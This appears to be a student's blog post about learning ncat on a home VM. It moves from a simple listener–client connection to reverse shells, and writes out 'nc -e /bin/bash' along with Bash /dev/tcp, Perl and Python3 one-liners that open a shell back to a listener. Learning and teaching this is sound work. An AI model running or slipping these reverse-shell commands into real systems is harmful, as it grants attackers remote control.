---
layout: post
title:  "reverse shell"
date:   2025-12-03 13:25:06 +0800
categories: 
---
## Discovery backstory

Today is the second day after the final exam for the semester and I had some time to kill. So I decided why not learn some networking. While learning the OSI model, I wanted to see how TCP or UDP works. After some experiments with `tcpdump`, I came across this interesting tool `ncat`. While I had read about it a couple of times, I never had much understanding on what it does. 

Before diving in we can have a look at `man ncat` for the descriptions and flags usage. We can see that Ncat in short is a networking tool for us to transmit bidirectional data across networks. For a simple proof of concept, I spun up one of my VM to test connection to my local network.

## Simple network connection (Level 0)

For the connection to work, we first needs to have a `listener` and `client`. Which in this case we will need to have either two computers, or just spin up a VM to establish a connection. 

I had setup the listener with command below:
{% highlight ruby %}
# 1. listener (on pc 1)
nc -lvp 6969

# 2. client (on pc 2)
nc -nv {listener\'s ip address} 6969
{% endhighlight %}

Some explanation of the command above:
### Listener
nc  =   Ncat tool  
flags  
-l  =   --listen, bind and listens to incoming connections, making pc1 a listener  
-v  =   --verbose, just set verbosity level to have some info of whats going on  
-p  =   --source-port, specify the source port, which in this case is port 6969  

### Client
-n  =   --nodns, takes the IP as it is, does not resolve to hostnames  
Listener's ip address can be obtained from many source, one simple one is `ip a` and retrieve from inet.

With the verbose flag, we should expect the following output from listener and client:  
Listener: `Ncat: Connection from {client's ip}:{client's port}`  
Client: `Connection to {listener's ip} {listener's port} port [tcp/*] succeeded!`  
Now you can try by typing in a text box, by sending "hello" or whatever you want to see it reflected it on the other pc. It works bidirectionally.

## Executing commands with Ncat (Level 1)

So it worked! And i was excited for it to work, while the writeup is simple. It took me a little time to google here and there for the information and why it worked. Reading the manuals for the first time also takes up some of my time. While reading the manuals, I came across this interesting flag of `-e` which stands for --exec <command>. 

Time to give it a try, with minor tweaks to the commands
{% highlight ruby %}
# 1. listener (on pc 1)
nc -lvp 6969

# 2. client (on pc 2)
nc -nv {listener's ip address} 6969 -e /bin/bash
{% endhighlight %}

Note that the listener is still the same, for client we have added in `-e /bin/bash` which makes a succesful reverse shell. We can check with the command `whoami` on the listener pc.

## What if..no netcat on pc2? (Level 2)

All seems well now, but I am imagining a scenario where there is no `Ncat` tool on the target pc. But I still want to be able to reverse the shell. Then i stumbled upon this [gold mine][ref_1] that has a number of different scripts. The benefit of this is we can use some native binaries available such as Bash, Perl, or Python(3) to achieve the same goal. Below are the codes for demo:

{% highlight ruby %}
# 1. listener (on pc 1)
nc -lvp 6969

# 2. client (on pc 2)
# Bash
bash -i >& /dev/tcp/{listener's ip address}/{listener's port} 0>&1
# Perl
perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
# Python3
python3 -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("10.0.0.1",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
{% endhighlight %}

For Perl and Python3, they are just writing a simple scripts on the command line with the `-e` or `-c` flag, mainly using the Sockets. The flow of the script is mainly to initialise a connection socker, redirect stdin to stdout, and stdout and stderr to listener. Then have an interactive session of /bin/sh.

These are more obvious in the Bash version, where we can see redirects in stdin, stdout or stderr used. A [better][ref_2] explanation is given on StackOverflow. Thats all for today, time to continue enjoying the holidays a little.

[ref_1]: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#php
[ref_2]: https://stackoverflow.com/questions/24793069/what-does-do-in-bash

### References
1. [Reverse Shell Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#php)
2. [What &\< means](https://stackoverflow.com/questions/24793069/what-does-do-in-bash)
